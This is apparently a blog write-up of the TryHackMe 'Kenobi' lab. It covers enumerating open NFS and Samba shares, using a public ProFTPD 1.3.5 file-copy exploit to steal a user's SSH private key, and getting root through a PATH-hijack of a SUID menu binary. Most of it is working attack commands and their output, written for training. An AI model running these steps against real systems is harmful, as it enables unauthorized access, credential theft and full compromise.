---
layout: post
title: "TryHackMe: Kenobi"
date: 2024-06-07 18:00 -0500
categories: [writeups, tryhackme]
tags:
  - samba
  - ProFtpd
  - path-variable-manipulation
image: /images/tryhackme_kenobi/kenobi.png
---
## Summary

Kenobi is an **EASY** room on [TryHackMe](https://tryhackme.com/r/room/kenobi) that involves accessing an open Samba share, and then abusing a vulnerable version of ProFtpd to get a foothold on the machine, and then abusing a SUID binary to elevate privileges to root. 

Please **NOTE**: The commands in this writeup vary slightly from the room walkthrough on THM. It's mostly down to personal preference, but with pentesting there are usually multiple ways to do something.

## Walkthrough

### Nmap Scan

The initial nmap scan shows that there are five ports open, as shown below:

```console
21/open/tcp/ftp/ProFTPD1.3.5
22/open/tcp/ssh/OpenSSH7.2p2Ubuntu4ubuntu2.7(UbuntuLinux;protocol2.0)
80/open/tcp/http/Apachehttpd2.4.18((Ubuntu))
111/open/tcp/rpcbind/2-4(RPC#100000)
139/open/tcp/netbios-ssn/Sambasmbd3.X-4.X(workgroup
```

### Service Footprinting

#### FTP - Port 21

Checking for anonymous access, it seems like anonymous access is allowed, but it's prompting for a full email as a password. Trying easy things like "anonymous", "anonymous{at}kenobi.thm", and a blank password didn't work. 

```console 
$ ftp $ip 21

Connected to 10.10.68.225.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]
Name (10.10.68.225:thomas): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

A later question will ask for the version number of ProFtpd running. It's in the output above, but we can also use `netcat` to grab the banner.

```console
$ nc -nv $ip 21

Connection to 10.10.68.225 21 port [tcp/*] succeeded!
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]
```

#### NFS - Port 111

It looks like there's a file share exported that we may be able to look at. 

```console
$ showmount -e $ip

Export list for 10.10.68.225:
/var *
```

We can mount the exported share with:

```console
$ sudo mount -t nfs $ip:/var var -o nolock
```

And then we can list the contents of the exported share.

![](images/tryhackme_kenobi/Pasted%20image%2020240607125757.png)

```console
$ tree
.
├── backups
│   └── apt.extended_states.0
├── cache
│   ├── apache2
│   │   └── mod_cache_disk
│   ├── apparmor
│   ├── apt
│   │   ├── archives
│   │   │   ├── lock
│   │   │   └── partial  [error opening dir]
│   │   ├── pkgcache.bin
│   │   └── srcpkgcache.bin
│   ├── debconf
│   │   ├── config.dat
│   │   ├── config.dat-old
│   │   ├── passwords.dat
│   │   ├── templates.dat
│   │   └── templates.dat-old
│   ├── ldconfig  [error opening dir]
│   ├── samba
│   │   ├── browse.dat
│   │   ├── gencache.tdb
│   │   └── printing
│   │       └── printers.tdb
│   └── snapd
│       ├── commands.db
│       ├── names
│       └── sections
├── crash
├── lib
│   ├── apache2
│   │   ├── conf
│   │   │   └── enabled_by_maint
│   │   │       ├── charset
│   │   │       ├── localized-error-pages
│   │   │       ├── other-vhosts-access-log
│   │   │       ├── security
│   │   │       └── serve-cgi-bin
│   │   ├── module
│   │   │   └── enabled_by_maint
│   │   │       ├── access_compat
│   │   │       ├── alias
│   │   │       ├── auth_basic
│   │   │       ├── authn_core
│   │   │       ├── authn_file
│   │   │       ├── authz_core
│   │   │       ├── authz_host
│   │   │       ├── authz_user
│   │   │       ├── autoindex
│   │   │       ├── deflate
│   │   │       ├── dir
│   │   │       ├── env
│   │   │       ├── filter
│   │   │       ├── mime
│   │   │       ├── mpm_event
│   │   │       ├── negotiation
│   │   │       ├── setenvif
│   │   │       └── status
│   │   └── site
│   │       └── enabled_by_admin
│   │           └── 000-default
│   ├── apparmor
│   │   └── profiles
│   ├── apt
│   │   ├── cdroms.list
│   │   ├── cdroms.list~
│   │   ├── daily_lock
│   │   ├── extended_states
│   │   ├── keyrings
│   │   │   └── ubuntu-archive-keyring.gpg
│   │   ├── lists
│   │   │   ├── lock
│   │   │   ├── partial  [error opening dir]
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_InRelease
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_main_binary-amd64_Packages
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_main_binary-i386_Packages
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_main_i18n_Translation-en
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_multiverse_binary-amd64_Packages
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_multiverse_binary-i386_Packages
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_multiverse_i18n_Translation-en
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_restricted_binary-amd64_Packages
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_restricted_binary-i386_Packages
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_restricted_i18n_Translation-en
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_universe_binary-amd64_Packages
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_universe_binary-i386_Packages
│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_universe_i18n_Translation-en
│   │   │   ├── Ubuntu-Server%2016.04.6%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20190226)_dists_xenial_main_binary-amd64_Packages
│   │   │   ├── Ubuntu-Server%2016.04.6%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20190226)_dists_xenial_Release
│   │   │   ├── Ubuntu-Server%2016.04.6%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20190226)_dists_xenial_Release.gpg
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_InRelease
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_binary-i386_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_i18n_Translation-en
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_universe_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_universe_binary-i386_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_universe_i18n_Translation-en
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_InRelease
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_main_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_main_binary-i386_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_main_i18n_Translation-en
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_multiverse_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_multiverse_binary-i386_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_multiverse_i18n_Translation-en
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_restricted_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_restricted_binary-i386_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_restricted_i18n_Translation-en
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_universe_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_universe_binary-i386_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_universe_i18n_Translation-en
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_InRelease
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_main_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_main_binary-i386_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_main_i18n_Translation-en
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_multiverse_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_multiverse_binary-i386_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_multiverse_i18n_Translation-en
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_restricted_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_restricted_binary-i386_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_restricted_i18n_Translation-en
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_binary-amd64_Packages
│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_binary-i386_Packages
│   │   │   └── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_i18n_Translation-en
│   │   ├── mirrors
│   │   │   └── partial
│   │   └── periodic
│   │       └── update-stamp
│   ├── dbus
│   │   └── machine-id
│   ├── dhcp
│   │   ├── dhclient.enp0s3.leases
│   │   └── dhclient.eth0.leases
│   ├── dpkg
│   │   ├── alternatives
│   │   │   ├── awk
│   │   │   ├── builtins.7.gz
│   │   │   ├── c89
│   │   │   ├── c99
│   │   │   ├── cc
│   │   │   ├── cpp
│   │   │   ├── editor

[...SNIP...]

│   ├── ureadahead
│   │   └── debugfs
│   ├── usbutils
│   │   └── usb.ids
│   ├── vim
│   │   └── addons
│   └── xml-core
│       ├── catalog
│       └── xml-core
├── local
├── lock -> /run/lock
├── log
│   ├── alternatives.log
│   ├── apache2
│   │   ├── access.log
│   │   ├── error.log
│   │   └── other_vhosts_access.log
│   ├── apt
│   │   ├── history.log
│   │   └── term.log
│   ├── auth.log
│   ├── bootstrap.log
│   ├── btmp
│   ├── dist-upgrade
│   ├── dmesg
│   ├── dpkg.log
│   ├── faillog
│   ├── fsck
│   │   ├── checkfs
│   │   └── checkroot
│   ├── installer
│   │   ├── cdebconf
│   │   │   ├── questions.dat
│   │   │   └── templates.dat
│   │   ├── hardware-summary
│   │   ├── initial-status.gz
│   │   ├── lsb-release
│   │   ├── media-info
│   │   ├── partman
│   │   ├── status
│   │   └── syslog
│   ├── kern.log
│   ├── lastlog
│   ├── lxd
│   ├── samba
│   │   ├── cores  [error opening dir]
│   │   ├── log.
│   │   ├── log.10.2.113.252
│   │   ├── log.192.168.1.147
│   │   ├── log.netwars
│   │   ├── log.nmap
│   │   ├── log.nmbd
│   │   └── log.smbd
│   ├── syslog
│   ├── unattended-upgrades
│   │   └── unattended-upgrades-shutdown.log
│   └── wtmp
├── mail
├── opt
├── run -> /run
├── snap
├── spool
│   ├── cron
│   │   ├── atjobs  [error opening dir]
│   │   ├── atspool  [error opening dir]
│   │   └── crontabs  [error opening dir]
│   ├── mail -> ../mail
│   ├── rsyslog  [error opening dir]
│   └── samba
├── tmp
│   ├── systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM  [error opening dir]
│   ├── systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw  [error opening dir]
│   ├── systemd-private-818a59a15eb94a49bfd3f3793a9f2233-systemd-timesyncd.service-yD1FDa  [error opening dir]
│   └── systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn  [error opening dir]
└── www
    └── html
        ├── admin.html
        ├── image.gif
        ├── image.jpg
        ├── index.html
        └── robots.txt

166 directories, 2456 files

```

Looking at `/var/log/auth.log` we can see there's a user called `kenobi` (SHOCKER!!) with the home directory `/home/kenobi`. There's not really anything to do with that for now though.

After looking over this briefly, it doesn't seem like there's anything SUPER juicy there, so we'll keep this in the cargo pocket and move on for now. 

#### SAMBA - Port 139

Using netexec, we can enumerate accessible shares on the server.

```console
$ nxc smb $ip -u '' -p '' --shares

SMB         10.10.68.225    445    KENOBI           [*] Windows 6.1 (name:KENOBI) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.68.225    445    KENOBI           [+] \:
SMB         10.10.68.225    445    KENOBI           [*] Enumerated shares
SMB         10.10.68.225    445    KENOBI           Share           Permissions     Remark
SMB         10.10.68.225    445    KENOBI           -----           -----------     ------
SMB         10.10.68.225    445    KENOBI           print$                          Printer Drivers
SMB         10.10.68.225    445    KENOBI           anonymous       READ
SMB         10.10.68.225    445    KENOBI           IPC$                            IPC Service (kenobi server (Samba, Ubuntu))
```

Note that we have anonymous access to the `anonymous` share. 

Using `smbclient.py` from Impacket, we an enumerate the share. Seems like there's one file present, called `log.txt`. 

```console
$ smbclient.py anonymous:anonymous@$ip

Impacket v0.12.0.dev1+20240523.75507.15eff880 - Copyright 2023 Fortra

Type help for list of commands

# shares
print$
anonymous
IPC$

# use anonymous
# ls -la
[-] SMB SessionError: code: 0xc000000f - STATUS_NO_SUCH_FILE - {File Not Found} The file %hs does not exist.
# ls
drw-rw-rw-          0  Wed Sep  4 05:49:09 2019 .
drw-rw-rw-          0  Wed Sep  4 05:56:07 2019 ..
-rw-rw-rw-      12237  Wed Sep  4 05:49:09 2019 log.txt

# cat log.txt
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21

# Don't use IPv6 support by default.
UseIPv6                         off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask                           022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances                    30

[...SNIP...]
```

### Initial Access

Checking exploit-db for exploits related to the ProFtpd version we identified, we see that there are 4 exploits found. 

![](images/tryhackme_kenobi/Pasted%20image%2020240607133035.png)

I'm going to grab the exploit 49908 using 

```console
$ searchsploit -m 49908
```

After modifying the exploit slightly, I was able to copy the `id_rsa` key from the `kenobi` user's home directory into the `/var/tmp/` directory so I'm able to access it though the share I mounted earlier. 

```console
$ python3 49908.py 10.10.68.225

220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]

350 File or directory exists, ready for destination name

250 Copy successful

350 File or directory exists, ready for destination name

550 cpto: Permission denied

Exploit Completed
[!] Something Went Wrong
[!] Directory might not be writable
```

After running the exploit, we can see that the key is now in the `/var/tmp` directory.

![](images/tryhackme_kenobi/Pasted%20image%2020240607134152.png)

After changing the permissions on the key to 600 (`chmod 600 <KEY>`) we're able to ssh into the box as the `kenobi` user. 

```console
$ ssh -i kenobi kenobi@$ip

The authenticity of host '10.10.68.225 (10.10.68.225)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.68.225' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$
```

### Privilege Escalation

We can list SUID binaries with the following command:

```console
$ find / -perm -u=s -type f 2>/dev/null
```

One stands out as odd.

![](images/tryhackme_kenobi/Pasted%20image%2020240607134737.png)

Running that binary, we're presented with three options. 

![](images/tryhackme_kenobi/Pasted%20image%2020240607134822.png)

Running through all the options once, it seems pretty straightforward, so we'll need to figure out a way to abuse it.

```console
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Fri, 07 Jun 2024 18:48:27 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:b9:3b:22:86:a7
          inet addr:10.10.68.225  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::b9:3bff:fe22:86a7/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:148597 errors:0 dropped:0 overruns:0 frame:0
          TX packets:148174 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:7005333 (7.0 MB)  TX bytes:9676051 (9.6 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:218 errors:0 dropped:0 overruns:0 frame:0
          TX packets:218 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:16277 (16.2 KB)  TX bytes:16277 (16.2 KB)
```

We can see when we run strings on the binary, that the actual commands that are being run are listed there. You'll also notice that they're not being called with absolute paths, so it might be possible to trick this binary into running something of our choosing. 

To do this, I'm going to copy `/bin/bash` to my home directory, and then modify my `PATH` environment variable to tell the system to essentially "Look for everything HERE first...". 

First, copy the `/bin/bash` binary to the home directory. 

```console
kenobi@kenobi:~$ cp /bin/bash .
```

Then, we can confirm that the `bash` binary is present in the home directory now.

```console
kenobi@kenobi:~$ ls -la
total 1056
drwxr-xr-x 5 kenobi kenobi    4096 Jun  7 13:55 .
drwxr-xr-x 3 root   root      4096 Sep  4  2019 ..
-rwxr-xr-x 1 kenobi kenobi 1037528 Jun  7 13:55 bash
lrwxrwxrwx 1 root   root         9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi     220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi    3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi    4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi     655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi    4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi    4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi      33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi     642 Sep  4  2019 .viminfo
```

Since we're attempting to trick the application into running our binary instead of the one it's supposed to run, we need to change the name of the `bash` binary to `ifconfig`

```console
kenobi@kenobi:~$ mv bash ifconfig
```

We also need to set the permissions on the copied `bash` binary to make sure that it doesn't drop privileges. 

```console
$ chmod 4777 ifconfig
```

Once we've done that, we can add the current working directory (`/home/kenobi` in my case) to the `PATH` environment variable. 

```console
kenobi@kenobi:~$ export PATH=.:$PATH
```

Running the `/usr/bin/menu` binary again and selecting option 3 causes the application to run OUR version of `bash` and gives us a shell as root. 

![](images/tryhackme_kenobi/Pasted%20image%2020240607140530.png)


